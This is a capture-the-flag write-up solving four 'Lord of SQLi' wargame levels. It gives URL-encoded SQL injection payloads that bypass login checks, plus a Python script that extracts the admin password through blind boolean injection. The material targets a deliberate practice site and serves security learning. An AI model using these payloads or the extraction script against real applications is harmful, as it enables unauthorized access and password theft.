# Lord of SQLi



## Gremlin
![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Gremlinq.png)
Solution:

Using ?id=1&pw=1%27%20or%201%23 would result the query execute.

query : select id from prob_gremlin where id='1' and pw='1' or 1#'

link: https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=1&pw=1%27%20or%201%23

## Cobolt

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Cobolt.png)

query : select id from prob_cobolt where id='' or id='admin' #' and pw=md5('')

link:https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=%27%20or%20id=%27admin%27%20%23

## Goblin

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Goblin.png)

query : select id from prob_goblin where id='guest' and no=1 or 1 limit 1,1

link: https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=1%20or%201%20limit%201,1#


## Orc
![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orc.png)


Script:

                import requests
                url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
                header={"Cookie":"PHPSESSID=3rrijviseh2kgti5bc5st8ov7u"}
                sess=requests.session()

                payload="?pw=' or id='admin' and length(pw)="
                for i in range(1,100):
                    pay=url+payload+str(i)+"%23"
                    x=sess.get(pay,headers=header)
                    print("Check:",i,end=" ")
                    
                    if "Hello admin" in x.text:
                        length=i
                        break
                    else:
                        print("Fail")
                print("Success\nlength:",length)

                wordlist="qwertyuiopasdfghjklzxcvbnm1234567890"
                payload="?pw=' or id='admin' and substr(pw,"
                password=''
                for i in range(1,length+1):
                    print("check:",i,end="")
                    for j in range(len(wordlist)):
                        pay=url+payload+str(i)+",1)="+wordlist[j]+"%23"
                        x=sess.get(pay,headers=header)
                        if "Hello admin" in x.text:
                            password+=wordlist[j]
                            print("pass:",wordlist[j])
                            break
                print("Password:"+password)
                
                

Output:
![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orcans.png)






